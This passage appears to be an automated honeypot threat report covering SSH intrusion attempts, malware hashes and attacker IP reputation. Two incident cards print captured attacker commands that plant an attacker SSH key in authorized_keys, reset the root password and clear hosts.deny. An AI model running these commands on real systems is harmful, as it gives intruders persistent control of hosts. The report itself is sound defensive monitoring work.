- [ ] Submit `119.203.251[.]187` to AbuseIPDB if not already reported
- [ ] Block `119.203.251[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-336bb7002e54

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:03 |
| **Last Seen** | 2026-06-10 10:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:03:23` | `cowrie.session.connect` |
| `2026-06-10 10:03:23` | `cowrie.client.version` |
| `2026-06-10 10:03:23` | `cowrie.client.kex` |
| `2026-06-10 10:03:24` | `cowrie.login.success` |
| `2026-06-10 10:03:24` | `cowrie.session.params` |
| `2026-06-10 10:03:24` | `cowrie.command.input` |
| `2026-06-10 10:03:24` | `cowrie.command.failed` |
| `2026-06-10 10:03:25` | `cowrie.log.closed` |
| `2026-06-10 10:03:25` | `cowrie.session.params` |
| `2026-06-10 10:03:25` | `cowrie.command.input` |
| `2026-06-10 10:03:25` | `cowrie.session.file_download` |
| `2026-06-10 10:03:25` | `cowrie.log.closed` |
| `2026-06-10 10:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4298a39e3641

| Field | Detail |
|---|---|
| **Source IP** | `196.189.237[.]172` |
| **First Seen** | 2026-06-10 10:03 |
| **Last Seen** | 2026-06-10 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:03:31` | `cowrie.session.connect` |
| `2026-06-10 10:03:31` | `cowrie.client.version` |
| `2026-06-10 10:03:31` | `cowrie.client.kex` |
| `2026-06-10 10:03:32` | `cowrie.login.success` |
| `2026-06-10 10:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.237[.]172` to AbuseIPDB if not already reported
- [ ] Block `196.189.237[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a6c4016e4fd

| Field | Detail |
|---|---|
| **Source IP** | `171.220.244[.]134` |
| **First Seen** | 2026-06-10 10:03 |
| **Last Seen** | 2026-06-10 10:04 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:j7UfVweQpCY9"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 10:03:47` | `cowrie.session.connect` |
| `2026-06-10 10:03:47` | `cowrie.client.version` |
| `2026-06-10 10:03:47` | `cowrie.client.kex` |
| `2026-06-10 10:03:48` | `cowrie.login.success` |
| `2026-06-10 10:03:48` | `cowrie.session.params` |
| `2026-06-10 10:03:48` | `cowrie.command.input` |
| `2026-06-10 10:03:48` | `cowrie.command.failed` |
| `2026-06-10 10:03:49` | `cowrie.log.closed` |
| `2026-06-10 10:03:49` | `cowrie.session.params` |
| `2026-06-10 10:03:49` | `cowrie.command.input` |
| `2026-06-10 10:03:49` | `cowrie.session.file_download` |
| `2026-06-10 10:03:49` | `cowrie.log.closed` |
| `2026-06-10 10:04:05` | `cowrie.session.params` |
| `2026-06-10 10:04:05` | `cowrie.command.input` |
| `2026-06-10 10:04:06` | `cowrie.log.closed` |
| `2026-06-10 10:04:06` | `cowrie.session.params` |
| `2026-06-10 10:04:06` | `cowrie.command.input` |
| `2026-06-10 10:04:06` | `cowrie.log.closed` |
| `2026-06-10 10:04:06` | `cowrie.session.params` |
| `2026-06-10 10:04:06` | `cowrie.command.input` |
| `2026-06-10 10:04:06` | `cowrie.session.file_download` |
| `2026-06-10 10:04:06` | `cowrie.log.closed` |
| `2026-06-10 10:04:07` | `cowrie.session.params` |
| `2026-06-10 10:04:07` | `cowrie.command.input` |
| `2026-06-10 10:04:07` | `cowrie.log.closed` |
| `2026-06-10 10:04:07` | `cowrie.session.params` |
| `2026-06-10 10:04:07` | `cowrie.command.input` |
| `2026-06-10 10:04:08` | `cowrie.log.closed` |
| `2026-06-10 10:04:08` | `cowrie.session.params` |
| `2026-06-10 10:04:08` | `cowrie.command.input` |
| `2026-06-10 10:04:08` | `cowrie.command.input` |
| `2026-06-10 10:04:08` | `cowrie.log.closed` |
| `2026-06-10 10:04:08` | `cowrie.session.params` |
| `2026-06-10 10:04:08` | `cowrie.command.input` |
| `2026-06-10 10:04:09` | `cowrie.log.closed` |
| `2026-06-10 10:04:09` | `cowrie.session.params` |
| `2026-06-10 10:04:09` | `cowrie.command.input` |
| `2026-06-10 10:04:09` | `cowrie.log.closed` |
| `2026-06-10 10:04:09` | `cowrie.session.params` |
| `2026-06-10 10:04:09` | `cowrie.command.input` |
| `2026-06-10 10:04:10` | `cowrie.log.closed` |
| `2026-06-10 10:04:10` | `cowrie.session.params` |
| `2026-06-10 10:04:10` | `cowrie.command.input` |
| `2026-06-10 10:04:10` | `cowrie.log.closed` |
| `2026-06-10 10:04:10` | `cowrie.session.params` |
| `2026-06-10 10:04:10` | `cowrie.command.input` |
| `2026-06-10 10:04:10` | `cowrie.log.closed` |
| `2026-06-10 10:04:11` | `cowrie.session.params` |
| `2026-06-10 10:04:11` | `cowrie.command.input` |
| `2026-06-10 10:04:11` | `cowrie.log.closed` |
| `2026-06-10 10:04:11` | `cowrie.session.params` |
| `2026-06-10 10:04:11` | `cowrie.command.input` |
| `2026-06-10 10:04:11` | `cowrie.log.closed` |
| `2026-06-10 10:04:12` | `cowrie.session.params` |
| `2026-06-10 10:04:12` | `cowrie.command.input` |
| `2026-06-10 10:04:12` | `cowrie.log.closed` |
| `2026-06-10 10:04:12` | `cowrie.session.params` |
| `2026-06-10 10:04:12` | `cowrie.command.input` |
| `2026-06-10 10:04:12` | `cowrie.log.closed` |
| `2026-06-10 10:04:13` | `cowrie.session.params` |
| `2026-06-10 10:04:13` | `cowrie.command.input` |
| `2026-06-10 10:04:13` | `cowrie.log.closed` |
| `2026-06-10 10:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.220.244[.]134` to AbuseIPDB if not already reported
- [ ] Block `171.220.244[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `143.110.178[.]27` | **317** | 2026-06-10 04:01 | 2026-06-10 10:08 | 271m | 0 | `T1592` | 🟠 MEDIUM |
| `128.199.25[.]179` | **86** | 2026-06-10 04:01 | 2026-06-10 09:59 | 59m | 0 | `T1592` | 🟠 MEDIUM |
| `106.13.100[.]52` | **31** | 2026-06-10 04:23 | 2026-06-10 05:05 | 43m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.47.155[.]9` | **30** | 2026-06-10 05:34 | 2026-06-10 06:30 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `188.215.31[.]4` | **30** | 2026-06-10 05:32 | 2026-06-10 06:25 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `204.168.240[.]142` | **30** | 2026-06-10 08:18 | 2026-06-10 09:13 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `4.182.219[.]135` | **30** | 2026-06-10 04:36 | 2026-06-10 05:42 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.33.93[.]17` | **30** | 2026-06-10 08:48 | 2026-06-10 09:45 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.13.70[.]73` | **28** | 2026-06-10 08:43 | 2026-06-10 09:26 | 39m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `24.199.122[.]229` | **21** | 2026-06-10 04:02 | 2026-06-10 04:10 | 2m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.118[.]189` | **20** | 2026-06-10 04:36 | 2026-06-10 05:24 | 30m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `157.245.1[.]7` | **16** | 2026-06-10 08:10 | 2026-06-10 08:42 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `31.56.178[.]132` | **15** | 2026-06-10 04:03 | 2026-06-10 04:53 | 1m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `182.44.116[.]87` | **12** | 2026-06-10 05:46 | 2026-06-10 06:11 | 10m | 6 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.154.77[.]48` | **11** | 2026-06-10 04:02 | 2026-06-10 04:22 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `196.189.237[.]172` | **10** | 2026-06-10 09:39 | 2026-06-10 10:07 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `5.182.83[.]231` | **7** | 2026-06-10 08:25 | 2026-06-10 08:50 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `114.130.85[.]36` | **6** | 2026-06-10 04:36 | 2026-06-10 05:52 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]188` | **5** | 2026-06-10 07:36 | 2026-06-10 07:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.154.158[.]70` | **4** | 2026-06-10 07:58 | 2026-06-10 08:07 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `207.154.230[.]149` | **4** | 2026-06-10 05:02 | 2026-06-10 05:11 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `119.203.251[.]187` | **3** | 2026-06-10 08:49 | 2026-06-10 10:02 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `218.51.148[.]194` | **3** | 2026-06-10 04:21 | 2026-06-10 04:25 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]133` | **3** | 2026-06-10 07:36 | 2026-06-10 07:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]226` | **3** | 2026-06-10 07:36 | 2026-06-10 07:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]237` | **3** | 2026-06-10 07:36 | 2026-06-10 07:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `76.79.213[.]69` | **3** | 2026-06-10 04:13 | 2026-06-10 04:17 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.142[.]171` | **2** | 2026-06-10 04:02 | 2026-06-10 04:04 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `167.71.225[.]225` | **2** | 2026-06-10 08:41 | 2026-06-10 09:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `171.220.244[.]134` | **2** | 2026-06-10 10:03 | 2026-06-10 10:05 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.98.128[.]249` | **2** | 2026-06-10 05:29 | 2026-06-10 05:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.15.20[.]116` | **2** | 2026-06-10 07:21 | 2026-06-10 07:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.23.63[.]217` | **2** | 2026-06-10 09:45 | 2026-06-10 09:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `64.89.162[.]149` | **2** | 2026-06-10 04:48 | 2026-06-10 04:48 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `101.126.64[.]76` | 1 | 2026-06-10 08:51 | 2026-06-10 08:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.12.157[.]104` | 1 | 2026-06-10 04:32 | 2026-06-10 04:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.12.29[.]184` | 1 | 2026-06-10 09:44 | 2026-06-10 09:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `108.167.177[.]224` | 1 | 2026-06-10 08:46 | 2026-06-10 08:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.23.117[.]116` | 1 | 2026-06-10 05:39 | 2026-06-10 05:39 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.118.224[.]96` | 1 | 2026-06-10 05:25 | 2026-06-10 05:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.233.39[.]105` | 1 | 2026-06-10 10:01 | 2026-06-10 10:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.26.185[.]176` | 1 | 2026-06-10 04:25 | 2026-06-10 04:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.46.184[.]6` | 1 | 2026-06-10 08:14 | 2026-06-10 08:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.13[.]223` | 1 | 2026-06-10 08:18 | 2026-06-10 08:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.114.113[.]177` | 1 | 2026-06-10 05:24 | 2026-06-10 05:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `13.71.92[.]229` | 1 | 2026-06-10 08:12 | 2026-06-10 08:12 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.112[.]105` | 1 | 2026-06-10 05:27 | 2026-06-10 05:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]172` | 1 | 2026-06-10 08:43 | 2026-06-10 08:43 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.114[.]20` | 1 | 2026-06-10 08:20 | 2026-06-10 08:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]167` | 1 | 2026-06-10 05:44 | 2026-06-10 05:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]166` | 1 | 2026-06-10 09:46 | 2026-06-10 09:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.21[.]179` | 1 | 2026-06-10 04:36 | 2026-06-10 04:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.48[.]24` | 1 | 2026-06-10 05:42 | 2026-06-10 05:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.171[.]99` | 1 | 2026-06-10 04:03 | 2026-06-10 04:03 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `167.71.225[.]225` | 1 | 2026-06-10 05:16 | 2026-06-10 05:16 | 14s | 0 | `T1592` | 🟢 LOW |
| `180.168.60[.]146` | 1 | 2026-06-10 09:30 | 2026-06-10 09:30 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.51[.]110` | 1 | 2026-06-10 04:06 | 2026-06-10 04:06 | 14s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]100` | 1 | 2026-06-10 05:41 | 2026-06-10 05:41 | 1s | 0 | `T1592` | 🟢 LOW |
| `20.81.140[.]174` | 1 | 2026-06-10 05:06 | 2026-06-10 05:06 | 20s | 0 | `T1592` | 🟢 LOW |
| `218.29.196[.]162` | 1 | 2026-06-10 04:53 | 2026-06-10 04:53 | 2s | 0 | `T1592` | 🟢 LOW |
| `41.82.50[.]218` | 1 | 2026-06-10 08:51 | 2026-06-10 08:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.251.174[.]254` | 1 | 2026-06-10 10:03 | 2026-06-10 10:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.174.174[.]10` | 1 | 2026-06-10 09:27 | 2026-06-10 09:28 | 30s | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | 1 | 2026-06-10 08:39 | 2026-06-10 08:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.229.253[.]119` | 1 | 2026-06-10 08:13 | 2026-06-10 08:13 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `64.62.197[.]197` | 1 | 2026-06-10 07:23 | 2026-06-10 07:23 | 0s | 3 | `T1110.001` | 🟢 LOW |
| `77.231.248[.]8` | 1 | 2026-06-10 09:49 | 2026-06-10 09:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `82.102.165[.]200` | 1 | 2026-06-10 07:35 | 2026-06-10 07:35 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.160.113[.]253` | 1 | 2026-06-10 07:31 | 2026-06-10 07:33 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `204.168.240[.]142` | FI | Hetzner Online GmbH | **100** ⚠️ | 2 |
| `20.81.140[.]174` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `120.26.185[.]176` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 3 |
| `218.29.196[.]162` | CN | China Unicom Henan province network | **100** ⚠️ | 50 |
| `157.245.1[.]7` | US | DigitalOcean, LLC | **100** ⚠️ | 32 |
| `90.160.113[.]253` | ES | Orange Espagne SA | **100** ⚠️ | 7 |
| `45.33.93[.]17` | US | Linode | **100** ⚠️ | 2 |
| `14.103.21[.]179` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `3.23.63[.]217` | US | Amazon Technologies Inc. | **100** ⚠️ | 1 |
| `31.56.178[.]132` | US | CGI GLOBAL LIMITED | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 523 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 286 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 173 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 85 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 85 |

---

## 🔕 False Positive Summary (71 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 41 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 24 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 1052 cases |
| Tool 34  | Credential Extractor        | ✅ 487 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 88 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 71 filtered (6.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 47 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
